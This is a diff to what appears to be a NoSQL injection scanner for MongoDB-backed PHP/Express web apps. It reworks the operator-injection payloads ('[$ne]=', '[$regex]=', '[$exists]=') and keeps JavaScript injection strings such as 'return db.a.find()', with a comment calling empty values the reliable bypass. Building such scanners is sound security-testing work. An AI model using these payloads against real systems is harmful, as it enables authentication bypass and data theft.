@@ -365,10 +365,10 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
 
         print("\n")
         if verb == "ON":
-            print("Testing PHP/ExpressJS [$in] associative array injection...")
+            print("Testing PHP/ExpressJS [$regex] associative array injection...")
             print("Injecting " + uriArray[19])
         else:
-            print("Test 9: PHP/ExpressJS [$in] associative array injection")
+            print("Test 9: PHP/ExpressJS [$regex] associative array injection")
 
         req = urllib.request.Request(uriArray[19], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 19)
@@ -382,10 +382,10 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
 
         print("\n")
         if verb == "ON":
-            print("Testing PHP/ExpressJS [$regex] associative array injection...")
+            print("Testing PHP/ExpressJS [$exists] associative array injection...")
             print("Injecting " + uriArray[20])
         else:
-            print("Test 10: PHP/ExpressJS [$regex] associative array injection")
+            print("Test 10: PHP/ExpressJS [$exists] associative array injection")
 
         req = urllib.request.Request(uriArray[20], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 20)
@@ -393,40 +393,6 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         if errorCheck == False:
             injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength, injLen, testNum, verb, None, 20)
-            testNum += 1
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print("Testing PHP/ExpressJS [$eq] associative array injection...")
-            print("Injecting " + uriArray[21])
-        else:
-            print("Test 11: PHP/ExpressJS [$eq] associative array injection")
-
-        req = urllib.request.Request(uriArray[21], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 21)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None, 21)
-            testNum += 1
-        else:
-            testNum += 1
-
-        print("\n")
-        if verb == "ON":
-            print("Testing PHP/ExpressJS [$exists] associative array injection...")
-            print("Injecting " + uriArray[22])
-        else:
-            print("Test 12: PHP/ExpressJS [$exists] associative array injection")
-
-        req = urllib.request.Request(uriArray[22], None, requestHeaders)
-        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 22)
-
-        if errorCheck == False:
-            injLen = int(len(getResponseBodyHandlingErrors(req)))
-            checkResult(randLength, injLen, testNum, verb, None, 22)
             testNum += 1
         else:
             testNum += 1
@@ -1136,7 +1102,7 @@ def buildUri(origUri, randValue, args=None):
     paramName = []
     paramValue = []
     global uriArray
-    uriArray = [""] * 23
+    uriArray = [""] * 21
     injOpt = []
 
     # Split the string between the path and parameters, and then split each parameter
@@ -1183,7 +1149,7 @@ def buildUri(origUri, randValue, args=None):
 
         if paramName[x] in injOpt:
             uriArray[0] += paramName[x] + "=" + randValue + "&"
-            uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
+            uriArray[1] += paramName[x] + "[$ne]=&"
             uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
             uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
             uriArray[4] += (
@@ -1239,11 +1205,11 @@ def buildUri(origUri, randValue, args=None):
                 + "&"
             )
             # Associative-array operator payloads (added for broader operator
-            # coverage): $in, $regex, $eq, $exists.
-            uriArray[19] += paramName[x] + "[$in]=&"
-            uriArray[20] += paramName[x] + "[$regex]=&"
-            uriArray[21] += paramName[x] + "[$eq]=&"
-            uriArray[22] += paramName[x] + "[$exists]=&"
+            # coverage): $regex, $exists. They use empty values because an
+            # empty value is the reliable bypass for these operators (a
+            # non-empty random value often matches nothing).
+            uriArray[19] += paramName[x] + "[$regex]=&"
+            uriArray[20] += paramName[x] + "[$exists]=&"
 
         else:
             uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
@@ -1267,13 +1233,11 @@ def buildUri(origUri, randValue, args=None):
             uriArray[18] += paramName[x] + "=" + paramValue[x] + "&"
             uriArray[19] += paramName[x] + "=" + paramValue[x] + "&"
             uriArray[20] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[21] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[22] += paramName[x] + "=" + paramValue[x] + "&"
         x += 1
 
     # Clip the extra & off the end of the URL
     x = 0
-    while x <= 22:
+    while x <= 20:
         uriArray[x] = (
             split_uri[0] + "?" + urllib.parse.quote_plus(uriArray[x][:-1])
         )
